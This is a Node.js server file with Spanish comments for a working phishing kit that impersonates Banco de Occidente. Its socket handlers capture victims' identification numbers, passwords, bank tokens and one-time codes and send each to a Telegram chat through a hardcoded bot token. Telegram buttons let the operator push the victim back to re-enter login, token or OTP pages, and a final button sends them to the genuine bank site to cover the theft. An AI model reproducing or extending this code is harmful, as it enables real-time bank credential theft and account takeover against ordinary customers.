const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

// ============================================
// CONFIGURACIÓN
// ============================================
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000,
    transports: ['websocket', 'polling']
});

const BOT_TOKEN = '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA';
const CHAT_ID = '-4997787461';
// IMPORTANTE: por defecto NO hace polling para evitar 409 Conflict (todas las bancas
// comparten el mismo bot token con el server raiz). Para correr esta banca de forma
// AISLADA exporta STANDALONE_BOT=1 antes de iniciar el proceso.
const _POLL_TG = process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true';
const bot = new TelegramBot(BOT_TOKEN, { polling: _POLL_TG });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

// ============================================
// SESIONES PERSISTENTES (NO EXPIRAN NUNCA)
// ============================================
const sessions = new Map();
const shortIdMap = new Map(); // shortId -> fullSessionId
let shortIdCounter = 1000;

// Generar ID corto para callback_data
function getShortId(fullSessionId) {
    // Buscar si ya existe
    for (const [shortId, fullId] of shortIdMap.entries()) {
        if (fullId === fullSessionId) return shortId;
    }
    
    // Crear nuevo ID corto
    const shortId = `s${shortIdCounter++}`;
    shortIdMap.set(shortId, fullSessionId);
    console.log('🔑 ID corto creado:', shortId, '→', fullSessionId);
    return shortId;
}

// Obtener ID completo desde ID corto
function getFullSessionId(shortId) {
    return shortIdMap.get(shortId);
}

// Limpiar sesiones inactivas solo después de 24 horas
setInterval(() => {
    const now = Date.now();
    const maxAge = 24 * 60 * 60 * 1000; // 24 horas
    
    for (const [id, session] of sessions.entries()) {
        if (session.lastActivity && (now - session.lastActivity) > maxAge) {
            sessions.delete(id);
            // Limpiar también del mapa de IDs cortos
            for (const [shortId, fullId] of shortIdMap.entries()) {
                if (fullId === id) shortIdMap.delete(shortId);
            }
            console.log('🗑️ Sesión limpiada (24h inactiva):', id);
        }
    }
}, 60 * 60 * 1000); // Revisar cada hora

// ============================================
// RUTAS
// ============================================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, '..', 'index.html')));

// ============================================
// SOCKET.IO
// ============================================
io.on('connection', (socket) => {
    console.log('✅ Cliente conectado:', socket.id);
    
    let sessionId = socket.id;
    
    // Crear/obtener sesión
    if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
            id: sessionId,
            socket: socket,
            data: {},
            pendingAction: null,
            lastActivity: Date.now(),
            createdAt: Date.now()
        });
        console.log('🆕 Nueva sesión creada:', sessionId);
    } else {
        const session = sessions.get(sessionId);
        session.socket = socket;
        session.lastActivity = Date.now();
    }

    // RESTAURAR SESIÓN
    socket.on('restore-session', (oldId) => {
        console.log('🔍 Intentando restaurar sesión:', oldId);
        console.log('📋 Sesiones activas:', Array.from(sessions.keys()));
        
        if (sessions.has(oldId)) {
            sessionId = oldId;
            const session = sessions.get(sessionId);
            session.socket = socket;
            session.lastActivity = Date.now();
            
            console.log('♻️ Sesión restaurada exitosamente:', sessionId);
            
            // Si hay acción pendiente, ejecutarla AHORA
            if (session.pendingAction) {
                console.log('⚡ Ejecutando acción pendiente:', session.pendingAction.url);
                socket.emit('redirect', session.pendingAction);
                session.pendingAction = null;
            }
            
            socket.emit('session-restored', { sessionId });
        } else {
            console.log('❌ Sesión NO encontrada, creando nueva');
            // Crear nueva sesión y guardarla
            sessionId = oldId; // Usar el ID antiguo para mantener continuidad
            sessions.set(sessionId, {
                id: sessionId,
                socket: socket,
                data: {},
                pendingAction: null,
                lastActivity: Date.now(),
                createdAt: Date.now()
            });
            socket.emit('session-restored', { sessionId });
        }
    });

    // LOGIN
    socket.on('login', async (data) => {
        const session = sessions.get(sessionId);
        if (session) {
            session.data.login = data;
            session.lastActivity = Date.now();
            
            const shortId = getShortId(sessionId);
            
            const message = `🔐 *LOGIN*\n\n📋 *Tipo:* ${data.tipoAcceso}\n📄 *Documento:* ${data.tipoDocumento}\n🆔 *Identificación:* \`${data.identificacion}\`\n${data.contrasena ? `🔑 *Contraseña:* \`${data.contrasena}\`\n` : ''}⏰ *Hora:* ${data.timestamp}`;
            
            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔄 Pedir Login', callback_data: `login_${shortId}` },
                        { text: '🎟️ Pedir Token', callback_data: `token_${shortId}` },
                        { text: '📱 Pedir OTP', callback_data: `otp_${shortId}` },
                        { text: '✅ Finalizar', callback_data: `finalizar_${shortId}` }
                    ]]
                }
            });
            
            socket.emit('login-received', { success: true });
            console.log('📤 Login enviado a Telegram');
        }
    });

    // TOKEN
    socket.on('token', async (data) => {
        const session = sessions.get(sessionId);
        if (session) {
            session.data.token = data;
            session.lastActivity = Date.now();
            
            const shortId = getShortId(sessionId);
            
            const message = `🎟️ *TOKEN*\n\n🔢 *Código:* \`${data.codigo}\`\n⏰ *Hora:* ${data.timestamp}`;
            
            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔄 Pedir Login', callback_data: `login_${shortId}` },
                        { text: '🎟️ Pedir Token', callback_data: `token_${shortId}` },
                        { text: '📱 Pedir OTP', callback_data: `otp_${shortId}` },
                        { text: '✅ Finalizar', callback_data: `finalizar_${shortId}` }
                    ]]
                }
            });
            
            socket.emit('token-received', { success: true });
            console.log('📤 Token enviado a Telegram');
        }
    });

    // OTP
    socket.on('otp', async (data) => {
        const session = sessions.get(sessionId);
        if (session) {
            session.data.otp = data;
            session.lastActivity = Date.now();
            
            const shortId = getShortId(sessionId);
            
            const message = `📱 *OTP*\n\n🔢 *Código:* \`${data.codigo}\`\n⏰ *Hora:* ${data.timestamp}`;
            
            await bot.sendMessage(CHAT_ID, message, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔄 Pedir Login', callback_data: `login_${shortId}` },
                        { text: '🎟️ Pedir Token', callback_data: `token_${shortId}` },
                        { text: '📱 Pedir OTP', callback_data: `otp_${shortId}` },
                        { text: '✅ Finalizar', callback_data: `finalizar_${shortId}` }
                    ]]
                }
            });
            
            socket.emit('otp-received', { success: true });
            console.log('📤 OTP enviado a Telegram');
        }
    });

    // DESCONEXIÓN
    socket.on('disconnect', () => {
        console.log('❌ Cliente desconectado:', socket.id);
        // NO eliminar la sesión, solo marcar como desconectado
        const session = sessions.get(sessionId);
        if (session) {
            session.lastActivity = Date.now();
            console.log('💾 Sesión guardada para reconexión:', sessionId);
        }
    });
});

// ============================================
// TELEGRAM CALLBACKS
// ============================================
bot.on('callback_query', async (query) => {
    const [action, shortId] = query.data.split('_');
    const sessionId = getFullSessionId(shortId);
    
    console.log('🔘 Botón:', action, '| ShortID:', shortId, '| SessionID:', sessionId);
    console.log('📋 Sesiones disponibles:', Array.from(sessions.keys()));
    
    if (!sessionId) {
        console.log('❌ ShortID inválido o expirado:', shortId);
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Sesión expirada' });
        return;
    }
    
    if (!sessions.has(sessionId)) {
        console.log('❌ Sesión NO encontrada, creando nueva para mantener continuidad');
        // Crear sesión temporal para que no se pierda la acción
        sessions.set(sessionId, {
            id: sessionId,
            socket: null,
            data: {},
            pendingAction: null,
            lastActivity: Date.now(),
            createdAt: Date.now()
        });
    }
    
    const session = sessions.get(sessionId);
    session.lastActivity = Date.now();
    const routes = {
        'login': { url: '/index.html', external: false },
        'token': { url: '/token.html', external: false },
        'otp': { url: '/otp.html', external: false },
        'finalizar': { url: 'https://www.bancodeoccidente.com.co/', external: true }
    };
    
    const redirect = routes[action];
    if (redirect) {
        // Guardar acción pendiente
        session.pendingAction = redirect;
        console.log('💾 Acción guardada:', redirect.url);
        
        // Intentar emitir si el socket está conectado
        if (session.socket && session.socket.connected) {
            console.log('📡 Socket conectado, emitiendo ahora...');
            session.socket.emit('redirect', redirect);
            session.pendingAction = null;
        } else {
            console.log('⏳ Socket desconectado, esperando reconexión...');
        }
    }
    
    await bot.answerCallbackQuery(query.id);
});

bot.on('polling_error', (err) => {
    if (err.code !== 'EFATAL') console.log('⚠️ Polling:', err.code);
});

// ============================================
// SERVIDOR
// ============================================
const PORT = 3000;
server.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════╗
║  🏦 BANCO DE OCCIDENTE            ║
║  ✅ http://localhost:${PORT}         ║
║  🤖 Telegram Bot Activo           ║
╚════════════════════════════════════╝
    `);
});
